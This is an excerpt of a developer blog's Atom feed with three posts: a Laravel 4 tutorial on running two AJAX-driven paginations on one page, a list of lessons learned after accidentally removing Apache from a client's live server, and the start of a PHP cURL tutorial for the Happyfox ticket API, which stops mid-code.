    <content type="html"><![CDATA[<p>Alright, if you’re existing <a href="http://laravel.com/">Laravel</a> user, you know that Laravel has make pagination easy. If you’re new, I will show you how.</p><p>First of all, in your <strong>app/routes.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;items&#x27;</span>, <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;as&#x27;</span> =&gt; <span class="string">&#x27;items&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;uses&#x27;</span> =&gt; <span class="string">&#x27;ItemController@getIndex&#x27;</span></span><br><span class="line">));</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>When user enter <code>http://&lt;your url&gt;.com/items</code>, it will matched and call the <code>getIndex</code> method in <code>ItemController</code> class</p><p><strong>app/controllers/ItemController.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getIndex</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 1</span></span><br><span class="line">    <span class="variable">$items_per_page</span> = <span class="title class_">Input</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;per_pg&#x27;</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2</span></span><br><span class="line">    <span class="variable">$items</span> = <span class="title class_">Item</span>::<span class="title function_ invoke__">paginate</span>(<span class="variable">$items_per_page</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;layout-&gt;content = <span class="title class_">View</span>::<span class="title function_ invoke__">make</span>(<span class="string">&#x27;items.index&#x27;</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">with</span>(<span class="string">&#x27;items&#x27;</span>, <span class="variable">$items</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>app/models/Item.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 4</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Item</span> <span class="keyword">extends</span> <span class="title">Eloquent</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$table</span> = <span class="string">&#x27;item&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>Get the data from query string</li><li>Look for the <code>Item</code> and paginate it to <em>n</em> items per page</li><li>Pass in the necessary value to the view</li><li>Create a class named <code>Item</code> and extends <code>Eloquent</code> ORM, it will make your life easy</li></ol><p>Do you realise there is no current page for pagination? Laravel did it for you. It will passed in the <code>page=3</code> for<br>example into the query string, so the <code>paginate</code> method will get the value from <code>page</code> <em>(in this case is <strong>3</strong>)</em><br>and indicate that it is the current selected page.</p><p><strong>The problem now is, what if I want to have 2 pagination in a single page?</strong></p><p>Assumption:</p><ul><li>each page has 10 items</li></ul><p>Let’s take an example, there are 2 tabs of listing, both under the same page/same URL, let’s called it<br><strong>impression</strong> &amp; <strong>conversion</strong>. Example, I have <code>999</code> items in <strong>impression</strong>, but I have only <code>44</code> items<br>in <strong>conversion</strong>, on the <strong>impression</strong> when I click on page 10, it will shows the 101th item to 110th item,<br>whereas <strong>conversion</strong> tab shows nothing. You know why? Because both of them taking the same argument from query<br>string, i.e. <code>page=10</code>, both of them also look for page 10. What we want is <strong>impression</strong> page 10, but <strong>conversion</strong><br>remain page 1.</p><p><img src="/images/posts/2014-08-23-laravel-4-two-pagination-in-a-single-page/no-ajax.gif" alt="No ajax"></p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>One of the solution that I found out is implement by using AJAX.</p><h3 id="1-Add-in-an-extra-routes"><a href="#1-Add-in-an-extra-routes" class="headerlink" title="1. Add in an extra routes"></a>1. Add in an extra routes</h3><p><strong>app/routes.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ADD THIS</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;items/ajax/&#123;type&#125;&#x27;</span>, <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;as&#x27;</span> =&gt; <span class="string">&#x27;items.type&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;uses&#x27;</span> =&gt; <span class="string">&#x27;ItemController@getItemType&#x27;</span></span><br><span class="line">))-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;impression|conversion&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;items&#x27;</span>, <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;as&#x27;</span> =&gt; <span class="string">&#x27;items&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;uses&#x27;</span> =&gt; <span class="string">&#x27;ItemController@getIndex&#x27;</span></span><br><span class="line">));</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>The <code>where</code> condition is to only match for either <code>impression</code> or <code>conversion</code>. Note that<br>you must put it above the <code>items</code>. Always put the more precise route to above.</p><h3 id="2-Implement-the-ajax-method-in-ItemController"><a href="#2-Implement-the-ajax-method-in-ItemController" class="headerlink" title="2. Implement the ajax method in ItemController"></a>2. Implement the ajax method in <code>ItemController</code></h3><p><strong>app/controllers/ItemController.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getItemType</span>(<span class="params"><span class="variable">$type</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$items_per_page</span> = <span class="title class_">Input</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;per_pg&#x27;</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$type</span> == <span class="string">&#x27;impression&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$items</span> = <span class="title class_">Impression</span>::<span class="title function_ invoke__">paginate</span>(<span class="variable">$items_per_page</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$items</span> = <span class="title class_">Conversion</span>::<span class="title function_ invoke__">paginate</span>(<span class="variable">$items_per_page</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.</span></span><br><span class="line">    <span class="variable">$view</span> = <span class="title class_">View</span>::<span class="title function_ invoke__">make</span>(<span class="string">&#x27;item_type&#x27;</span>)-&gt;<span class="title function_ invoke__">with</span>(<span class="string">&#x27;items&#x27;</span>, <span class="variable">$items</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$view</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>I’m not return JSON on the AJAX call, but instead, I return the whole bunch of HTML.</li></ol><p>But before that, make sure you create a <strong>model</strong> class for both <strong>impression</strong> &amp; <strong>conversion</strong> just like<br>what you did for <strong>Item.php</strong> just now.</p><h3 id="3-Create-a-new-view-file-that-keep-only-the-particular-section-of-code"><a href="#3-Create-a-new-view-file-that-keep-only-the-particular-section-of-code" class="headerlink" title="3. Create a new view file that keep only the particular section of code"></a>3. Create a new view file that keep only the particular section of code</h3><p><strong>app/views/item_type.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;table <span class="class"><span class="keyword">class</span>=&quot;<span class="title">table</span>&quot;&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">thead</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">th</span>&gt;<span class="title">ID</span>&lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">th</span>&gt;<span class="title">Key</span>&lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">thead</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">tbody</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">foreach</span> ($<span class="title">items</span> <span class="title">as</span> $<span class="title">item</span>): ?&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">td</span>&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">item</span>-&gt;<span class="title">id</span>; ?&gt;&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">td</span>&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">item</span>-&gt;<span class="title">key</span>; ?&gt;&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">endforeach</span>; ?&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">tbody</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">// 1.</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">items</span>-&gt;<span class="title">appends</span>(<span class="title">Input</span>::<span class="title">except</span>(&#x27;<span class="title">page</span>&#x27;))-&gt;<span class="title">links</span>(); ?&gt;</span></span><br></pre></td></tr></table></figure><ol><li>The pagination link I also included into the ajax, this will make your life easier.</li></ol><h3 id="4-Then-add-in-the-Ajax-call-on-the-main-view-file"><a href="#4-Then-add-in-the-Ajax-call-on-the-main-view-file" class="headerlink" title="4. Then add in the Ajax call on the main view file"></a>4. Then add in the Ajax call on the main view file</h3><p>add the section to bottom right before <code>&lt;/body&gt;</code></p><p><strong>app/views/items.php</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 1.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getPaginationSelectedPage</span>(<span class="params">url</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> chunks = url.<span class="title function_">split</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> baseUrl = chunks[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> querystr = chunks[<span class="number">1</span>].<span class="title function_">split</span>(<span class="string">&#x27;&amp;&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> pg = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (i <span class="keyword">in</span> querystr) &#123;</span><br><span class="line">            <span class="keyword">var</span> qs = querystr[i].<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (qs[<span class="number">0</span>] == <span class="string">&#x27;page&#x27;</span>) &#123;</span><br><span class="line">                pg = qs[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2.</span></span><br><span class="line">    $(<span class="string">&#x27;#impression&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="string">&#x27;.pagination a&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        e.<span class="title function_">preventDefault</span>();</span><br><span class="line">        <span class="keyword">var</span> pg = <span class="title function_">getPaginationSelectedPage</span>($(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;href&#x27;</span>));</span><br><span class="line"></span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&#x27;/items/ajax/impression&#x27;</span>,</span><br><span class="line">            <span class="attr">data</span>: &#123; <span class="attr">page</span>: pg &#125;,</span><br><span class="line">            <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">                $(<span class="string">&#x27;#impression&#x27;</span>).<span class="title function_">html</span>(data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $(<span class="string">&#x27;#conversion&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="string">&#x27;.pagination a&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        e.<span class="title function_">preventDefault</span>();</span><br><span class="line">        <span class="keyword">var</span> pg = <span class="title function_">getPaginationSelectedPage</span>($(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;href&#x27;</span>));</span><br><span class="line"></span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&#x27;/items/ajax/conversion&#x27;</span>,</span><br><span class="line">            <span class="attr">data</span>: &#123; <span class="attr">page</span>: pg &#125;,</span><br><span class="line">            <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">                $(<span class="string">&#x27;#conversion&#x27;</span>).<span class="title function_">html</span>(data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.</span></span><br><span class="line">    $(<span class="string">&#x27;#impression&#x27;</span>).<span class="title function_">load</span>(<span class="string">&#x27;/items/ajax/impression?page=1&#x27;</span>);</span><br><span class="line">    $(<span class="string">&#x27;#conversion&#x27;</span>).<span class="title function_">load</span>(<span class="string">&#x27;/items/ajax/conversion?page=1&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol><li>Look for the selected page number</li><li>Create an event listener to listen the <code>onclick</code> event on the pagination link.</li><li>When the page first loaded <em>(which has no any click yet)</em>, load the first page of both items.</li></ol><p>You have done. See the result</p><p><img src="/images/posts/2014-08-23-laravel-4-two-pagination-in-a-single-page/ajax.gif" alt="Ajax"></p><p><a href="/attachments/posts/2014-08-23-laravel-4-two-pagination-in-a-single-page/sample.zip">Download the sample source code</a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Alright, if you’re existing &lt;a href=&quot;http://laravel.com/&quot;&gt;Laravel&lt;/a&gt; user, you know that Laravel has make pagination easy. If you’re</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="laravel4" scheme="http://jslim.net/tags/laravel4/"/>
    
  </entry>
  
  <entry>
    <title>7 lessons learnt from screwing up a live server</title>
    <link href="http://jslim.net/blog/2014/08/12/7-lessons-learnt-from-screwing-up-a-live-server/"/>
    <id>http://jslim.net/blog/2014/08/12/7-lessons-learnt-from-screwing-up-a-live-server/</id>
    <published>2014-08-12T06:21:48.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I’ve just did a <strong>shit</strong> today. I screw up the client’s server in such a way that I remove the apache server, and never get a way to install it back.</p><p>It makes me feel uncomfortable, sweating and stimulate my brain cell until I lost for some time…</p><p>However, I’ve learnt some lessons here. Please read all, especially if you’re newbie developer or fresh graduate.</p><h2 id="1-Never-bring-habits-from-development-to-production"><a href="#1-Never-bring-habits-from-development-to-production" class="headerlink" title="1. Never bring habits from development to production"></a>1. Never bring habits from development to production</h2><p>Imagine that during development, your web server suddenly doesn’t work, and you googles the solution for hours. What you’ll do now?<br>For most of us the answer would be <em>“remove the web server, then reinstall”</em>, right? And most of the time we think we’re genius,<br>because it was so simple, so fast, so easily solved. But… I did this today on the client’s server…</p><p>I’ve tried to setup a project for hours, but don’t know why it doesn’t works. I removed it. YEAH~~~ removed successfully without any<br>error, but later on when I try to install, it failed, and again, I have no idea why…</p><p>Please do remember this, don’t bring whatever habits that you usually did in local machine to production.</p><h2 id="2-Never-trust-solutions-on-stackexchange-when-comes-to-production"><a href="#2-Never-trust-solutions-on-stackexchange-when-comes-to-production" class="headerlink" title="2. Never trust solutions on stackexchange when comes to production"></a>2. Never trust solutions on stackexchange when comes to production</h2><p><em>“Try this! It works like a charm”</em></p><p>Seen this before? If you visit stackoverflow often, you sure have seen it thousands of times.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> yum <span class="built_in">erase</span> ...</span><br></pre></td></tr></table></figure><p>I run this command by referring to one of the stackexchange’s question. Of course, before remove I’ve think before,<br>but since remove a package we can install it back later easily by <code>yum install</code>, so I run the command…</p><p>The consequence is, <code>yum install</code> doesn’t work… That moment I was <em>“SHIT!!! What’s wrong with that? What I’ve done…”</em>.<br>I immediately awake <em>(before that I was a little bit sleepy)</em>.</p><p>If you have found any solution online, please try it on local machine before apply it on live server.</p><h2 id="3-Be-hyper-extra-careful-when-dealing-with-delete-remove-something-from-server"><a href="#3-Be-hyper-extra-careful-when-dealing-with-delete-remove-something-from-server" class="headerlink" title="3. Be hyper-extra careful when dealing with delete/remove something from server"></a>3. Be hyper-extra careful when dealing with delete/remove something from server</h2><p>Previously, I alwasy remind myself that database on live server must be extra careful, especially executing query.</p><p>But now, I only realise that when come’s to deletion <em>(or something cannot be undone)</em> must be very very careful.<br>Yeah, removing a package/program might not affect the process much, and it can be install back easily.</p><p>Again, for my case it doesn’t install back easily <em>(in fact, until now still not able to install it back)</em>, a lot of<br>funny/unexpected situation may happen. Eventhough it can install back, but do you know the original configuration?<br>Can you configure it back exactly same as the original?</p><p>Think about it.</p><h2 id="4-Always-double-confirm"><a href="#4-Always-double-confirm" class="headerlink" title="4. Always double confirm"></a>4. Always double confirm</h2><p>Confirm what? I attempt to start the <strong>httpd</strong> server, but it always failed, no matter how I configure.<br>Then I run the following command</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ service httpd status</span><br><span class="line"><span class="literal">Stopped</span></span><br></pre></td></tr></table></figure><p>It shows that the server is not running. Since it does not running and yet it cannot be started. So I remove it.<br>I never check carefully whether there are other services using it. I should double check with the following<br>command</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -tulpn <span class="string">| less</span></span><br></pre></td></tr></table></figure><p>If I check it first, I may not remove the server.</p><p>So, please check find other way(s) <em>(if there are)</em> to double confirm the thing is not running, eventhough<br>one side shows that it is not using/running, but is always better to double confirm.</p><h2 id="5-Never-make-assumption"><a href="#5-Never-make-assumption" class="headerlink" title="5. Never make assumption"></a>5. Never make assumption</h2><p>From the message above shows that <strong>httpd</strong> is not running, that means it is not in use.</p><p>The above statement is my assumption. It was pretty logic, doesn’t it? Just like <em>“If the door is locked, the light is<br>off, that means there nobody in the house or everybody in sleep.”</em>, but can it be someone still watching TV with no<br>light?</p><p>Human light to make assumption base on their pass experience, me too. When dealing with other people server, don’t<br>make assumption, because you’re not familiar with their configuration. What you configure all the time is not what<br>they configure.</p><h2 id="6-Take-10-15-minutes-break-when-feeling-frustrated"><a href="#6-Take-10-15-minutes-break-when-feeling-frustrated" class="headerlink" title="6. Take 10 - 15 minutes break when feeling frustrated"></a>6. Take 10 - 15 minutes break when feeling frustrated</h2><p>Before I get the <strong>root</strong> access, I already spent for quite a long time on researching how to install <strong>httpd</strong> without<br>root access.</p><p>When the time that I get the <strong>root</strong> access, I immediately <strong>ssh</strong> to server and thought that I can get<br>it done in 15 minutes. I was rushing <em>(perhaps is because of overdue)</em>, you know, when we’re rushing, our mind<br>cannot focus/think, once I found the <em>solution</em> <em>(so call)</em> then I straight away uninstall the package.</p><p>So when you’re really frustrated, don’t panic, take a break. I’m sure the consequence will be far better than<br>you’re panic.</p><h2 id="7-Always-discuss-with-superior-when-doing-something-critical-on-server"><a href="#7-Always-discuss-with-superior-when-doing-something-critical-on-server" class="headerlink" title="7. Always discuss with superior when doing something critical on server"></a>7. Always discuss with superior when doing something critical on server</h2><p><em>“I want to be independent”</em></p><p>Some time, I feel like lack of confidence to get things done. Independent could be a good training for me.</p><p>Ya, independent is good. But some time, get an opinion from other perspective may not be bad, especially<br>get opinion from those who’re more experience than you. </p><p>If I discuss with my superior today, this <em>shit</em> won’t happen and this post won’t be existed.</p><p>Thus, I advice you that don’t feel <em>shy</em> to ask your superior.</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Things that already happened, could not be changed. Time wasn’t reverse. Remember, <em>mistake is a learning<br>process</em>. Today I made this mistake, hopefully can help you to prevent making the same mistake as mine.</p><p>Please remember all the points above.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’ve just did a &lt;strong&gt;shit&lt;/strong&gt; today. I screw up the client’s server in such a way that I remove the apache server, and never get</summary>
        
      
    
    
    
    
    <category term="server" scheme="http://jslim.net/tags/server/"/>
    
  </entry>
  
  <entry>
    <title>Happyfox API - Create ticket with attachment using PHP</title>
    <link href="http://jslim.net/blog/2014/07/26/happyfox-api-create-ticket-with-attachment-using-php/"/>
    <id>http://jslim.net/blog/2014/07/26/happyfox-api-create-ticket-with-attachment-using-php/</id>
    <published>2014-07-26T22:43:12.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.happyfox.com/">Happyfox</a> is a ticketing service provider. Recently I’m dealing with it’s API and took me quite some time to figure out <em>how to create a ticket with attachment</em>. You can see the <a href="http://www.happyfox.com/developers/api/1.1/">official documentation here</a>.</p><h2 id="1-Create-an-account-and-Generate-API-key"><a href="#1-Create-an-account-and-Generate-API-key" class="headerlink" title="1. Create an account and Generate API key"></a>1. Create an account and Generate API key</h2><p>You can <a href="https://www.happyfox.com/help-desk-signup/">sign up an account</a></p><p>Now you can create api key</p><p><img src="/images/posts/2014-07-27-happyfox-api-create-ticket-with-attachment-using-php/api-1.png" alt="Create API key step 1"></p><p><img src="/images/posts/2014-07-27-happyfox-api-create-ticket-with-attachment-using-php/api-2.png" alt="Create API key step 2"></p><p><img src="/images/posts/2014-07-27-happyfox-api-create-ticket-with-attachment-using-php/api-3.png" alt="Create API key step 3"></p><p>Enter <strong>Identification Name</strong> and save it</p><p><img src="/images/posts/2014-07-27-happyfox-api-create-ticket-with-attachment-using-php/api-4.png" alt="Create API key step 4"></p><h2 id="2-Get-your-username-amp-password"><a href="#2-Get-your-username-amp-password" class="headerlink" title="2. Get your username &amp; password"></a>2. Get your <code>username</code> &amp; <code>password</code></h2><p>As the requirement mention that HTTP Basic Authentication is required, thus you need to have a <code>username</code> &amp; <code>password</code></p><p><img src="/images/posts/2014-07-27-happyfox-api-create-ticket-with-attachment-using-php/get-credential-1.png" alt="Get credential"></p><p><strong>Note: you must move your mouse over only you can see the link <code>see auth code</code></strong></p><p><img src="/images/posts/2014-07-27-happyfox-api-create-ticket-with-attachment-using-php/get-credential-2.png" alt="See auth code"></p><p>The <strong>API key</strong> served as <code>username</code> and <strong>Auth code</strong> served as <code>password</code>.</p><h2 id="3-Make-a-POST-request-thru-PHP-cURL"><a href="#3-Make-a-POST-request-thru-PHP-cURL" class="headerlink" title="3. Make a POST request thru PHP cURL"></a>3. Make a POST request thru PHP cURL</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// get your data ready</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;subject&#x27;</span> =&gt; <span class="string">&#x27;How to change the DNS server&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;text&#x27;</span> =&gt; <span class="string">&#x27;Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor ...&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;category&#x27;</span> =&gt; <span class="number">1</span>, <span class="comment">// set your category (if you not sure about that, just put 1)</span></span><br><span class="line">    <span class="string">&#x27;email&#x27;</span> =&gt; <span class="string">&#x27;john.smith@example.com&#x27;</span>, <span class="comment">// web user&#x27;s email</span></span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;John Smith&#x27;</span>, <span class="comment">// web user&#x27;s name</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Optional. Note that there is an &#x27;@&#x27; infront</span></span><br><span class="line">    <span class="string">&#x27;attachments&#x27;</span> =&gt; <span class="string">&#x27;@/home/user/Desktop/screenshot.png&#x27;</span>, <span class="comment">// attachment&#x27;s path</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="string">&#x27;https://&lt;youraccount&gt;.happyfox.com/api/1.1/json/tickets/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POST, <span class="literal">true</span>); <span class="comment">// this is POST request</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, 